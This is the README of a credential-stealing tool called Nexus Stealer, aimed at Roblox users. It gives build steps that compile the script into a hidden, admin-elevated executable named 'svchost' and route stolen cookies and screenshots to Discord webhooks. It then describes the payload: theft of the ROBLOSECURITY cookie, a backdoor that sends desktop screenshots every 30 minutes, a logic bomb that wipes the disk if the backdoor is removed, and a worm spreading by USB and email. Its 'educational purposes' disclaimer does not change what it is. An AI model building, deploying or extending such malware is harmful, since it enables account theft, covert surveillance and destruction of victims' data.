# NEXUS STEALER *V1.0.0*

**Disclaimer**: This code is provided for **educational purposes only**. I do not endorse or encourage any misuse, illegal activities, or damage caused by this code. By using this script, you agree that **you are solely responsible** for your actions. I bears no liability for any consequences arising from the use of this tool.

---

## Updates
**Version :** *V1.0.0*

- Official Public Release

---

## Installation and customization

Change the :
```
COOKIE_WEBHOOK_URLS = ["1", "1_backup"]
SCREENSHOT_WEBHOOK_URLS = ["2", "2_backup"]
```
By 4 **DIFFERENT** discord webhooks

Install the dependencies :
```
pip install psutil requests pywin32 pyautogui cryptography netifaces
```
Convert to .exe :
```
pyinstaller --onefile --noconsole --hidden-import psutil --hidden-import requests --hidden-import pywin32 --hidden-import pyautogui --hidden-import cryptography --hidden-import netifaces --hidden-import win32crypt --hidden-import win32gui --hidden-import win32con --hidden-import win32process --hidden-import win32security --hidden-import win32api --hidden-import win32file --uac-admin --name svchost NexusStealer.py
```

---

## Explanation

When executed on a machine, the script will wait for a **Roblox Related** application to be oppened. He will then search the whole computer data and browser data in search of the roblox login cookie (ROBLOSECURITY). Once found, it will send the cookie to the designed webhook, leave behind him a backdoor that will send a screenshot of the targeted user desktop **every 30 Minutes** and leave another logic bomb that will continuisly check to see if the backdoor has been deleted, if yes, it will wipe the whole user computer from top to bottom. 

***DO NOT RUN THIS SCRIPT ON YOUR OWN MACHINE OR ON SOMEONE ELSE MACHINE WITHOUT THEIR CONSENT.***
**Ive implemented a WORM in the script, meaning that it will spread in the network through usb and emails. Please be cautious of the uses of this script.**
